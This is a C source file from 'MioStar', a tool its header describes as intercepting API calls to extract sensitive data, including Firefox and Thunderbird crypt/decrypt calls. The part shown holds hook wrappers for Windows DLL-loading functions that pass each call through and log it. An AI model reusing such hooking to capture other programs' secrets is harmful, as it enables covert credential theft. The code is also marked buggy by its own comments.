/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */


#include <windows.h>
#include <stdio.h>
#include "MioStar.h"
#include "Kernel32Replacement.h"


extern byte* CG_LoadLibraryA;
extern byte* CG_LoadLibraryW;
extern byte* CG_LoadLibraryExA;
extern byte* CG_LoadLibraryExW;
extern byte* CG_GetModuleHandleA;
extern byte* CG_GetModuleHandleW;
extern byte* CG_GetModuleHandleExA;
extern byte* CG_GetModuleHandleExW;
extern byte* CG_GetProcAddress;
extern byte* CG_FreeLibrary;


extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;




/*
 *
 *
 */

HMODULE WINAPI MyLoadLibraryA(LPCSTR lpFileName)
{
  HMODULE lRetVal = NULL;
  MYLOADLIBRARYA fMyLoadLibraryA = (MYLOADLIBRARYA) CG_LoadLibraryA;
  char lTemp1[MAX_BUF_SIZE + 1];

  ZeroMemory(lTemp1, sizeof(lTemp1));

  if(fMyLoadLibraryA)
    lRetVal = fMyLoadLibraryA(lpFileName);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyLoadLibraryA():DLL:%s:%d:%s", gProcShortPath, lRetVal, lpFileName);
  printDebug(lTemp1, EVENT_SYSTEM);



  return(lRetVal);
}





/*
 *
 *
 */

HMODULE WINAPI MyLoadLibraryW(LPCWSTR lpFileName)
{
  HMODULE lRetVal = NULL;
  MYLOADLIBRARYW fMyLoadLibraryW = (MYLOADLIBRARYW) CG_LoadLibraryW;
  char lTemp[MAX_BUF_SIZE + 1];

  ZeroMemory(lTemp, sizeof(lTemp));

  if(fMyLoadLibraryW)
    lRetVal = fMyLoadLibraryW(lpFileName);

// BUG!!!!!!  
//  snprintf(lTemp, sizeof(lTemp) - 1, "MyLoadLibraryW():%s:%d:%S", gProcShortPath, lRetVal, L"lpFileName");
//snprintf(lTemp, sizeof(lTemp) - 1, "MyLoadLibraryW():%s:%d", gProcShortPath, lRetVal);
//  snprintf(lTemp, sizeof(lTemp) - 1, "MyLoadLibraryW():%s", gProcShortPath);
//  printDebug(lTemp, EVENT_SYSTEM);
//printDebug("MyLoadLibraryW()", EVENT_SYSTEM);

  return(lRetVal);
}






/*
 *
 *
 */

HMODULE WINAPI MyLoadLibraryExA(LPCSTR lpFileName, HANDLE hFile, DWORD dwFlags)
{
  HMODULE lRetVal = NULL;
  MYLOADLIBRARYEXA fLoadLibraryExA = (MYLOADLIBRARYEXA) CG_LoadLibraryExA;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fLoadLibraryExA)
    lRetVal = fLoadLibraryExA(lpFileName, hFile, dwFlags);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyLoadLibraryExA():DLL:%s:%d:%s", gProcShortPath, lRetVal, lpFileName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);
}



/*
 *
 *
 */

HMODULE WINAPI MyLoadLibraryExW(LPCWSTR lpFileName, HANDLE hFile, DWORD dwFlags)
{
  HMODULE lRetVal = NULL;
  MYLOADLIBRARYEXW fLoadLibraryExW = (MYLOADLIBRARYEXW) CG_LoadLibraryExW;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fLoadLibraryExW)
    lRetVal = fLoadLibraryExW(lpFileName, hFile, dwFlags);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyLoadLibraryExW():DLL:%s:%d:%S", gProcShortPath, lRetVal, lpFileName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);
}






/*
 *
 *
 */

HMODULE WINAPI MyGetModuleHandleA(LPCSTR lpModuleName)
{
  HMODULE lRetVal = NULL;
  MYGETMODULEHANDLEA fGetModuleHandleA = (MYGETMODULEHANDLEA) CG_GetModuleHandleA;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fGetModuleHandleA)
    lRetVal = fGetModuleHandleA(lpModuleName);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyGetModuleHandleA():DLL:%s:%d:%s", gProcShortPath, lRetVal, lpModuleName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);
}




/*
 *
 *
 */

HMODULE WINAPI MyGetModuleHandleW(LPCWSTR lpModuleName)
{
  HMODULE lRetVal = NULL;
  MYGETMODULEHANDLEW fGetModuleHandleW = (MYGETMODULEHANDLEW) CG_GetModuleHandleW;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fGetModuleHandleW)
    lRetVal = fGetModuleHandleW(lpModuleName);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyGetModuleHandleW():DLL:%s:%d:%S", gProcShortPath, lRetVal, lpModuleName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);
}



/*
 *
 *
 */

BOOL WINAPI MyGetModuleHandleExA(DWORD dwFlags, LPCSTR lpModuleName, HMODULE *phModule)
{
  BOOL lRetVal = FALSE;
  MYGETMODULEHANDLEEXA fGetModuleHandleExA = (MYGETMODULEHANDLEEXA) CG_GetModuleHandleExA;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fGetModuleHandleExA)
    lRetVal = fGetModuleHandleExA(dwFlags, lpModuleName, phModule);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyGetModuleHandleExA():DLL:%s:%s", gProcShortPath, lpModuleName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);  
}





/*
 *
 *
 */

BOOL WINAPI MyGetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule)
{
  BOOL lRetVal = FALSE;
  MYGETMODULEHANDLEEXW fGetModuleHandleExW = (MYGETMODULEHANDLEEXW) CG_GetModuleHandleExW;
  char lTemp[MAX_BUF_SIZE + 1];

  if(fGetModuleHandleExW)
    lRetVal = fGetModuleHandleExW(dwFlags, lpModuleName, phModule);


  snprintf(lTemp, sizeof(lTemp) - 1, "MyGetModuleHandleExW():DLL:%s:%d:%s", gProcShortPath, *phModule, lpModuleName);
  printDebug(lTemp, EVENT_SYSTEM);

  return(lRetVal);    
}





/*
 *
 *
 */

FARPROC WINAPI MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
  FARPROC lRetVal = NULL;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char lTemp3[MAX_BUF_SIZE + 1];
  int lProcNameAddr = (int) lpProcName;
  MYGETPROCADDRESS fGetProcAddress = (MYGETPROCADDRESS) CG_GetProcAddress;
  
  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));
  ZeroMemory(lTemp3, sizeof(lTemp3));
  

  if(fGetProcAddress)
    lRetVal = fGetProcAddress(hModule, lpProcName);

// OMG!!! Buuuuug!
// A hack ... :/

  if ((int) lProcNameAddr > 1024)
  {
    strncpy(lTemp2, lpProcName, MAX_BUF_SIZE);
	GetModuleFileName(hModule, lTemp3, sizeof(lTemp3) - 1);
    snprintf(lTemp1, sizeof(lTemp1) - 1, "MyGetProcAddress():DLL:%s:%s:%s", gProcShortPath, lTemp3, lTemp2);
    printDebug(lTemp1, EVENT_SYSTEM);
  } else {
    strcpy(lTemp2, "ORDINAL");
	strcpy(lTemp3, "UNKNOWN");
  }


  return(lRetVal);
}






/*
 *
 *
 */

BOOL WINAPI MyFreeLibrary(HMODULE hModule)
{
  BOOL lRetVal = FALSE;
  MYFREELIBRARY fFreeLibrary = (MYFREELIBRARY) CG_FreeLibrary;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if(fFreeLibrary)
    lRetVal = fFreeLibrary(hModule);
 
  GetModuleFileName(hModule, lTemp2, sizeof(lTemp2) - 1);
  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyFreeLibrary():DLL:%s:%s", gProcShortPath, lTemp2);
  printDebug(lTemp1, EVENT_SYSTEM);

  return(lRetVal);    
}
